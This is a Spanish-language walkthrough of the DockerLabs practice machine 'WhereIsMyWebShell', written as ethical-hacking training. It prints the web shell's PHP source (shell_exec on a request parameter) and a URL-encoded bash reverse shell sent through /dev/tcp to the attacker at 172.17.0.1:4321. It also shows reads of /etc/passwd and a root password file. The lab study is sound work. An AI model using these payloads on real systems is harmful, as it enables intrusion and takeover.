---
title: WhereIsMyWebShell
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-04-30
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-whereismywebshell/whereismywebshell_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - data_leaks
  - fuzzing_web
  - interactive_tty
  - php
  - rce
  - information_gathering
  - web_analysis
  - foothold
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.092 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.092/0.092/0.092/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.2 -n -Pn -oG nmap1
Host: 172.17.0.2 ()     Status: Up
Host: 172.17.0.2 ()     Ports: 80/open/tcp//http///     Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ sudo nmap -sCV -p80 -vvv 172.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
```terminal
http://172.17.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.17.0.2], Title[Academia de Inglés (Inglis Academi)]
```

---
## Web Analysis

El servicio web se presenta con una interfaz sencilla y sin funcionalidades visibles.

![](assets/img/dockerlabs-writeup-whereismywebshell/whereismywebshell1_1.png)

Al final del sitio se encuentra una posible pista.

![](assets/img/dockerlabs-writeup-whereismywebshell/whereismywebshell1_2.png)

Utilizo dirb para realizar un escaneo de extensiones comunes de configuración y scripts.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ dirb http://172.17.0.2/ -X .md,.txt,.php,.conf,.html
---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/index.html (CODE:200|SIZE:2510)
+ http://172.17.0.2/shell.php (CODE:500|SIZE:0)
```

El escaneo revela un archivo potencialmente vulnerable `shell.php`. Este script podría permitir la ejecución de comandos arbitrarios.

Utilizo wfuzz para identificar parámetros válidos que puedan ser explotados dentro del archivo `shell.php`.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/shell.php?FUZZ=id -t 200 --hc 404 --hw 227,0
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000115401:   200        2 L      4 W        66 Ch       "parameter"
```

El parámetro `parameter` responde con código 200 y diferencias en el contenido, lo que indica su procesamiento por parte del script. Y por web, confirmo la presencia de ejecución remota de comandos.

![](assets/img/dockerlabs-writeup-whereismywebshell/whereismywebshell1_3.png)

---
## Foothold

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ curl http://172.17.0.2/shell.php?parameter=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ curl http://172.17.0.2/shell.php?parameter=cat%20shell.php
<pre><?php
    echo "<pre>" . shell_exec($_REQUEST['parameter']) . "</pre>";
?>

</pre>
```

Esta vulnerabilidad me permite establecer una reverse shell utilizando bash.

* Se inicia una escucha con netcat en la máquina atacante.
* Luego se invoca el payload para obtener acceso interactivo al servidor.

```terminal
/home/kali/Documents/dockerlabs/whereismywebshell:-$ sudo nc -nvlp 4321
	listening on [any] 4321 ...

/home/kali/Documents/dockerlabs/whereismywebshell:-$ curl http://172.17.0.2/shell.php?parameter=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4321%200%3E%261%22

	... connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36708
www-data@83d254f24abc:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Privilege Escalation

Se configura una pseudo-terminal interactiva para mejorar la estabilidad de la sesión.

```terminal
www-data@83d254f24abc:/var/www/html$ script /dev/null -c bash
www-data@83d254f24abc:/var/www/html$ ^Z

/home/kali/Documents/dockerlabs/whereismywebshell:-$ stty raw -echo;fg
[1]  + continued  nc -nvlp 4321
				reset xterm

www-data@83d254f24abc:/var/www/html$ export TERM=xterm
www-data@83d254f24abc:/var/www/html$ export SHELL=bash
```

Enumero usuarios válidos del sistema mediante el archivo `/etc/passwd`, buscando aquellos con acceso a shells interactivos.

```terminal
www-data@83d254f24abc:/$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Teniendo en cuenta ls pista anterior, se inspecciona el directorio `/tmp` y se localiza un archivo oculto que contiene una contraseña.

```terminal
www-data@83d254f24abc:/$ cat /tmp/.secret.txt 
contraseñaderoot123
```

Finalmente, esta contraseña me proporciona acceso al usuario `root`.

```terminal
www-data@83d254f24abc:/$ su root 
Password: contraseñaderoot123

root@83d254f24abc:/# id
uid=0(root) gid=0(root) groups=0(root)
```
